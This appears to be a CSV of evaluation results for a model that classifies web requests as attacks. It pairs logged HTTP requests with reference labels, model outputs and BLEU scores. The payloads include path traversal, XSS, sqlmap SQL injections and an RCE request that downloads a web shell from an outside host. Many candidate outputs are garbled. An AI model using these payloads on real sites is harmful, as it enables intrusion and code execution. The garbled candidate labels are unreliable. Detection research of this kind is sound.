payload,reference_text,candidate_text,bleu_score
"GET / artStudio / AjaxartistList. do? pageIndex =.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. / etc / passwd & searchCcdId = & searchStuId = & searchText = HTTP / 1. 1 \ r \ nReferer : http : / / www. mmca. go. kr / \ r \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : www. mmca. go. kr \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nConnection : Keep - alive",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd Attack Type : Path Traversal,Label : 1 Attack Syntax : . . . . . . . . / . . / . . . . . . / . . . . / . . . . . . . . . . . . . / . . . . / . . . . . . . . . . . . . . . . . / / / Attack Attack : : Path Path,0.05662956541139549
"GET / main / board / kboard _ list. asp page = & search _ t = - - > "" ; < / script > < img + src = javascript : alert ( 1681 ) + & search _ m = 200 Mozilla / 5. 0 + ( Windows + NT + 6. 1 ; + WOW64 ; + Trident / 7. 0 ; + rv : 11. 0 ) + like + Gecko,","Label : 1 Attack Syntax : GET / main / board / kboard _ list. asp page = & search _ t = - - > "" ; < / script > < img + src = javascript : alert ( 1681 ) + & search _ m = 200 Mozilla / 5. 0 + ( Windows + NT + 6. 1 ; + WOW64 ; + Trident / 7. 0 ; + rv : 11. 0 ) + like + Gecko, Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : - - > "" < < > > > > > = : : javascript > > > > Attack Attack Type : Cross Scripting Site ( XSS",0.058521289428652236
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" ) ) / * * / AND / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 5116 = 7012 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CAST ( ( CHR ( 75 ) | | CHR ( 87 ) | | CHR ( 116 ) | | CHR ( 72 ) ) / * * / AS / * * / NUMERIC ) / * * / END ) ) / * * / IS / * * / NULL / * * / AND / * * / ( ( "" XWuQ "" = "" XWuQ sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" ) ) / * * / AND / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 5116 = 7012 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CAST ( ( CHR ( 75 ) | | CHR ( 87 ) | | CHR ( 116 ) | | CHR ( 72 ) ) / * * / AS / * * / NUMERIC ) / * * / END ) ) / * * / IS / * * / NULL / * * / AND / * * / ( ( "" XWuQ "" = "" XWuQ Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 "" ) ) / * * / AND / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 5094 = 5094 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CAST ( ( CHR ( 114 ) | | CHR ( 78 ) | | CHR ( 77 ) | | CHR ( 70 ) ) / * * / AS / * * / NUMERIC ) / * * / END ) ) / * * / IS / * * / NULL / * * / AND / * * / ( ( "" "" "" = "" TRtM Attack Type : SQL Injection",0.8208777173186248
"GET / board / board _ write? code = < blink + ondblclick = "" alert ( 1 ) "" > test < / blink > HTTP / 1. 1 Host : 10. 0. 20. 20 User - Agent : Mozilla / 5. 0 ( X11 ; Linux i686 ; rv : 60. 0 ) Gecko / 20100101 Firefox / 60. 0 Accept - Encoding : gzip, deflate Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 Connection : close Accept - Language : en - US, en ; q = 0. 5 DNT : 1 Upgrade - Insecure - Requests : 1","Label : 1 Attack Syntax : < blink ondblclick = "" alert ( 1 ) "" > test < / blink > Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : font onmouseover = "" alert ( 1 ) "" > test < / / > Attack Type : Cross - Site Scripting ( XSS )",0.7639225615341296
"GET / sparql? output = json & format = json & timeout = 0 & query = SELECT DISTINCT * WHERE {? object? property < http : / / data. visitkorea. or. kr / resource / CATEGORY : 311107 >. FILTER ( isIRI (? object ) ) } LIMIT 100 & callback = lodlive HTTP / 1. 1Host : data. visitkorea. or. krAccept - Language : en - USCookie : JSESSIONID = 4942F431EF74988840CA7A3DD7A94DD2. routerReferer : http : / / data. visitkorea. or. kr / lodlive? http : / / data. visitkorea. or. kr / resource / CATEGORY : 311107Connection : keep - aliveAccept : * / * From : googlebot ( at ) googlebot. comUser - Agent : Mozilla / 5. 0 ( Linux ; Android 6. 0. 1 ; Nexus 5X Build / MMB29P ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 98. 0. 4758. 102 Mobile Safari / 537. 36 ( compatible ; Googlebot / 2. 1 ; + http : / / www. google. com / bot. html ) Accept - Encoding : gzip, deflate, br",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / gamehubnew / databbs / FileDown. do? atchFileId = FILE _ 000000000284106 "" ) AND 8178 = 9481 AND ( "" HDjN "" = "" HDjN & fileSn = 1 & bbsId = B0000204 HTTP / 1. 1 \ r \ nCache - Control : no - cache \ r \ nUser - Agent : Mozilla / 5. 0 ( X11 ; Linux i686 on x86 _ 64 ; rv : 5. 0a2 ) Gecko / 20110524 Firefox / 5. 0a2 \ r \ nHost : gamehub. or. kr \ r \ nAccept : * / * \ r \ nAccept - Encoding : gzip, deflate \ r \ nConnection : close","Label : 1 Attack Syntax : AND 8178 = 9481 AND ( "" HDjN "" = "" HDjN Attack Type : SQL Injection","Label : 1 Attack Syntax : AND = = AND AND "" "" "" "" Attack Type : SQL Injection",0.449374068576077
"7 g E x ) : ~'g "" Z ` z ) ( 1 8 5. 1 1 2. 1 6 4. 7 8 ) by 1 9 2. 1 6 8. 1 0 0. 1 2 3 with ESMTP ; 2 Aug 2 0 2 2 1 1 : 2 0 : 1 3 + 0 9 0 0 X - Original - SPF : none ( localhost : domain at cznet. cz does not designate permitted sender hosts ) X - Original - SENDERIP : 1 8 5. 1 1 2. 1 6 4. 7 8 X - Original - SENDERCOUNTRY : CZ COMMA Czechia X - Original - MAILFROM : postgres @ cznet. cz X - Original - RCPTTO : blchoi @ busanpa. com Received : from cznet. cz ( 4 5. 1 4 7. 2 3 1. 1 7 3 ) by SCHPEXCH. sdomain. local ( 1 9 2. 1 6 8. 5 0. 5 2 ) with Microsoft SMTP Server ( TLS ) id 1 5. 0. 1 4 9 7. 3 6 ; Tue COMMA 2 Aug 2 0 2 2 0 4 : 2 0 : 0 7 + 0 2 0 0 From : JEIL Park < postgres @ cznet. cz > To : < blchoi @ busanpa. com > Subject : ATTACH PO INQUIRY Date : Mon COMMA 1 Aug 2 0 2 2 1 9 : 2 0 : 0 6 - 0 7 0 0 Message - ID : < 2 0 2 2 0 8 0 1 1 9 1 3 2 0. 0 0 DE 0 E 1 7 FD 3 4 F 3 BE @ cznet. cz > MIME - Version : 1. 0 Content - Type : multipart / alternative ; boundary = "" - - - - = _ Part _ 3 2 5 3 7 1 5 _ 1 9 1 9 9 0 2 0 1 4. 1 6 5 9 4 0 6 8 5 0 6 9 3 "" Return - Path : postgres @ cznet. cz X - ClientProxiedBy : SCHPEXCH. sdomain. local ( 1 9 2. 1 6 8. 5 0. 5 2 ) To SCHPEXCH. sdomain. local ( 1 9 2. 1 6 8.",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
- 6658 / * * / OR / * * / 6722 = UTL _ INADDR. GET _ HOST _ ADDRESS ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 6722 = 6722 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / DUAL ) | | CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) - - / * * / WYRF / dvwa /,Label : 1 Attack Syntax : - 6658 / * * / OR / * * / 6722 = UTL _ INADDR. GET _ HOST _ ADDRESS ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 6722 = 6722 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / DUAL ) | | CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) - - / * * / WYRF Attack Type : SQL Injection,Label : 1 Attack Syntax : - ' / * * / OR / * * / 6722 = UTL _ INADDR . GET . HOST _ ADDRESS ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 3234 = 6722 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / DUAL ) | | CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) - / / * / / Attack Attack Attack Type :,0.8900028562024771
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = 2d7c2405c187808463203926cb75fe4c _ 78879 & sid = 7186b215a7c391a5f33c0b073fa0b2d7 _ 83703 & guuid = 2d7c2405c187808463203926cb75fe4c _ 78879 & expired = 1613385591 & dr = http : / / www. kocis. go. kr / eng / main. do & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / htmlBoard / fpcContact. do & js = Y & sr = 1536x864 & scd = 24 & je = N & tz = 1 & tye = 2021 & tmo = 2 & tda = 15 & tho = 11 & tmi = 9 & tse = 51 & lng = it - IT & os = Win32 & cpu = & vr = 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 88. 0. 4324. 150 Safari / 537. 36 & ck = Y & brsz = 1536x666 & isnw = N HTTP / 1. 1 \ nHost : logger. kcisa. kr \ nConnection : keep - alive \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 88. 0. 4324. 150 Safari / 537. 36 \ nAccept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ nReferer : http : / / www. kocis. go. kr / \ nAccept - Encoding : gzip, deflate \ nAccept - Language : it - IT, it ; q = 0. 9, ko - KR ; q = 0. 8, ko ; q = 0. 7, en - GB ; q = 0. 6, en ; q = 0. 5, en - US ; q = 0. 4",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = 98f96407a17c20292f114badd6a6d2a2 _ 58625 & sid = 11bbf3185bdb903ef243f331ea5cc1d6 _ 51297 & guuid = 98f96407a17c20292f114badd6a6d2a2 _ 58625 & expired = 1619153478 & dr = http : / / 10. 114. 135. 170 : 8090 / eng / search. do & XDR = & dt = Korean Culture and Information Service & du = http : / / 10. 114. 135. 170 : 8090 / eng / search. do & js = Y & sr = 1920x1080 & scd = 24 & je = N & tz = 9 & tye = 2021 & tmo = 4 & tda = 23 & tho = 13 & tmi = 21 & tse = 18 & lng = ko & os = Win32 & cpu = & vr = 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 90. 0. 4430. 72 Safari / 537. 36 Edg / 90. 0. 818. 42 & ck = Y & brsz = 1920x969 & isnw = N HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 90. 0. 4430. 72 Safari / 537. 36 Edg / 90. 0. 818. 42 \ r \ nAccept : image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ r \ nReferer : http : / / 10. 114. 135. 170 : 8090 / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 ) ) ; DECLARE / * * / @ LRXv / * * / NVARCHAR ( 4000 ) ; SET / * * / @ LRXv = ( SELECT / * * /'qjkzq'+ ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 4254 = 4254 ) / * * / THEN / * * /'1'/ * * / ELSE / * * /'0'/ * * / END ) ) +'qjbbq') ; EXEC / * * / @ LRXv - - sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,",Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 ) ) ; DECLARE / * * / @ LRXv / * * / NVARCHAR ( 4000 ) ; SET / * * / @ LRXv = ('qjkzq'+ ( SELECT / * * / ( CASE / * * / WHEN / * * / 4254 = 4254 / * * / THEN / * * /'1'/ * * / ELSE / * * /'0'/ * * / END ) ) ) +'qjbbq') ; EXEC / * * / @ LRXv - - Attack Type : SQL Injection,Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 ) ) ; DECLARE / * * / @ = / * * / NVARCHAR ( 4000 ) ; SELECT / * * / ( = = ( SELECT / * * / / ' ' = ( SELECT / * * / ( CASE / * * / * / * * / ( ' = 9298 ) / * * / THEN / * * / ' / ' ' * * / ' / * * ' ' 0 ' / * END ) ) ) ' ' ' ' ' ; - / * * / ' ' ' - sqlmap / 1 . 5 . 1 . 40 # dev ( http : / / sqlmap . org ) security = impossible ; ; = Type : : : : Injection Injection,0.4194472606240042
"GET / /? a = fetch & templateFile = public / index & prefix ='' & content = < php > file _ put _ contents ('nuan. php ', file _ get _ contents ('https : / / t. gy22. xyz / upload / data. txt') ) ; < / php > HTTP / 1. 1 Connection : Keep - Alive Accept : * / * Accept - Language : zh - cn Referer : http : / / www. dongposarang. com / /? a = fetch & templateFile = public / index & prefix ='' & content = < php > file _ put _ contents ('nuan. php ', file _ get _ contents ('https : / / t. gy22. xyz / upload / data. txt') ) ; < / php > User - Agent : Mozilla / 5. 0 ( compatible ; Baiduspider / 2. 0 ; + http : / / www. baidu. com / search / spider. html ) Host : www. dongposarang. com","Label : 1 Attack Syntax : file _ put _ contents ('nuan. php ', file _ get _ contents ('https : / / t. gy22. xyz / upload / data. txt') ) Attack Type : Remote Code Execution ( RCE )",Label : 1 Attack Syntax : . . > : Type Type : Attack Attack,0.06803306684809736
"GET / media / mediaList. do? mdatp _ cd = MD02 & page = /.. \.. \ WEB - INF \ web. xml HTTP / 1. 1 \ r \ nReferer : http : / / archive. acc. go. kr / \ r \ nCookie : JSESSIONID = hyx0Js8BbEoMzhRawtXT1rjTjZH5cBV0XwzIoqrnKi5RdUvUJqbXQLt3QWMmX1Oy. amV1c19kb21haW4vYXJjaGl2ZV9zZXJ2ZXI = \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nX - Akamai - CONFIG - LOG - DETAIL : true \ r \ nTE : chunked ; q = 1. 0 \ r \ nConnection : TE \ r \ nAccept - Encoding : gzip \ r \ nAkamai - Origin - Hop : 1 \ r \ nVia : 1. 1 akamai. net ( ghost ) ( AkamaiGHost ) \ r \ nX - Forwarded - For : 155. 159. 255. 233 \ r \ nTrue - Client - IP : 155. 159. 255. 233 \ r \ nHost : archive. acc. go. kr \ r \ nPragma : no - cache \ r \ nCache - Control : no - cache, max - age = 0 \ r \ nConnection : keep - alive",Label : 1 Attack Syntax :.. \.. \ WEB - INF \ web. xml Attack Type : Directory Traversal,Label : 1 Attack Syntax : . . \ \ . \ \ \ - - \ . xml xml Attack Attack Type : Traversal Traversal Traversal,0.20389696163541748
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = e4c538149700c073e36ff168702d9134 _ 72329 & sid = fe4f0600ed11e1eff8dde1060c5bfbdd _ 26295 & guuid = e4c538149700c073e36ff168702d9134 _ 72329 & expired = 1617429265 & dr = http : / / www. mcst. go. kr / & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / openInformation. do & js = Y & sr = 1536x864 & scd = 24 & je = N & tz = 8 & tye = 2021 & tmo = 4 & tda = 3 & tho = 13 & tmi = 24 & tse = 25 & lng = zh - CN & os = Win32 & cpu = & vr = 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 & ck = Y & brsz = 1536x722 & isnw = N HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 \ r \ nAccept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ r \ nReferer : http : / / www. kocis. go. kr / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : zh - CN, zh ; q = 0. 9",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = PDF'; / * * / AND / * * / 6913 = CTXSYS. DRITHSX. SN ( 6913, ( CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 107 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 6913 = 6913 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / DUAL ) | | CHR ( 113 ) | | CHR ( 98 ) | | CHR ( 98 ) | | CHR ( 122 ) | | CHR ( 113 ) ) ) sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ;,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = PDF'; / * * / AND / * * / 6913 = CTXSYS. DRITHSX. SN ( 6913, ( CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 107 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 6913 = 6913 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / DUAL ) | | CHR ( 113 ) | | CHR ( 98 ) | | CHR ( 98 ) | | CHR ( 122 ) | | CHR ( 113 ) ) ) sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible, Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = PDF ' ; / * * / AND / * * / 5657 = CTXSYS . DRITHSX . SN ( 2606 , ( CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 107 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 2606 = 2606 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / DUAL ) | | CHR ( 113 ) | | CHR ( 98 ) | | CHR ( 98 ) | | CHR ( 122 ) | | CHR ( 113 ) ) ) Attack Type : SQL Injection",0.7849931080459359
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 ) / * * / AND / * * / 9568 = RAISE _ ERROR ( CHR ( 55 ) | | CHR ( 48 ) | | CHR ( 48 ) | | CHR ( 48 ) | | CHR ( 49 ), CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9568 = 9568 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / SYSIBM. SYSDUMMY1 ) | | CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) - - / * * / AdQz sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 ) / * * / AND / * * / 9568 = RAISE _ ERROR ( CHR ( 55 ) | | CHR ( 48 ) | | CHR ( 48 ) | | CHR ( 48 ) | | CHR ( 49 ), CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9568 = 9568 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / SYSIBM. SYSDUMMY1 ) | | CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) - - / * * / Attack Type : SQL Injection",Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 ) / * * / AND / * * / 4635 = RAISE _ ERROR ( CHR ( 55 ) | | CHR ( 48 ) | | CHR ( 48 ) | | CHR ( 48 ) | | CHR ( 49 ) ) CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 4635 = 4635 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) / * * / FROM / * * / SYSIBM . SYSDUMMY1 ) | | CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) - - / * * / Attack Attack : Type : SQL Injection,0.8747996779994995
""" panel "" style = "" padding : 0px ; "" > < div id = "" content1d "" > < div class = "" radio "" > < label > < input type = "" radio "" id = "" radio1e "" name = "" questionContainer : optionsPanel : question : 0 : actualQuestionPanel : radioGroup "" value = "" radio0 "" / > < span class = "" font - weight - light text - hard - light "" > < / span > < / label > < / div > < div class = "" radio "" > < label > < input type = "" radio "" id = "" radio1f "" name = "" questionContainer : optionsPanel : question : 0 : actualQuestionPanel : radioGroup "" value = "" radio1 "" / > < span class = "" font - weight - light text - hard - light "" > < / span > < / label > < / div > < / div > < / div > < / div > < / div > < div id = "" radioGroupFeedback20 "" hidden = "" "" data - wicket - placeholder = "" "" > < / div > < / div > < / div > < / div > < div class = "" btn - container fixed - margin - top "" > < a href = "" # "" class = "" btn btn - primary btn - dyn "" id = "" submit18 "" > < span id = "" submitLabel21 "" > < / span > < / a > < img style = "" display : none "" class = "" margin - left - xxs "" src = "".. / assets / img / loading - spin. gif "" alt = "" Loading.. "" id = "" loadingSpin19 "" / > < / div > < / div > < / form > < / div > ] ] > < / component > < header - contribution > <! [ CDATA [ < head xmlns : wicket = "" http : / / wicket. apache. org "" > < script type = "" text / javascript "" src = "" / / entercdn. ipsosinteractive. com / wicket / resource / org. apache. wicket. resource. JQueryResourceReference /",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
